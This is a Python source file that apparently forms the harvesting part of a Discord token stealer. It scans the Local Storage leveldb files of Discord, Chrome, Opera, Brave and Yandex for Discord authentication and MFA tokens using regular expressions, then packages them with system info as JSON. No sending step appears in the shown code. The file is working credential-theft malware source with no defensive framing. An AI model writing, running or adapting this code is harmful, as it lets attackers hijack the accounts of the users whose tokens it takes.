import json
import os
import re

def findTokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if not tokens.__contains__(token):
                            tokens.append(token)
    except FileNotFoundError:
        pass

    return tokens

def locateTokens(getJson):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'discord': roaming + '\\Discord',
        'discord canary': roaming + '\\discordcanary',
        'discord ptb': roaming + '\\discordptb',
        'chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'opera': roaming + '\\Opera Software\\Opera Stable',
        'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    data = {
        'attempted': True,
        'system': {},
        'tokens': {}
    }

    data['system'] = {
        'name': os.name
    }

    for platform, path in paths.items():
        data['tokens'][platform] = {
            'found': True,
            'tokens': []
        }

        if not os.path.exists(path):
            data['tokens'][platform]['found'] = False
            continue

        tokens = findTokens(path)

        if len(tokens) > 0:
            data['tokens'][platform]['tokens'] = tokens
        else:
            data['tokens'][platform]['found'] = False

    if getJson:
        return json.dumps(data)
    else:
        return data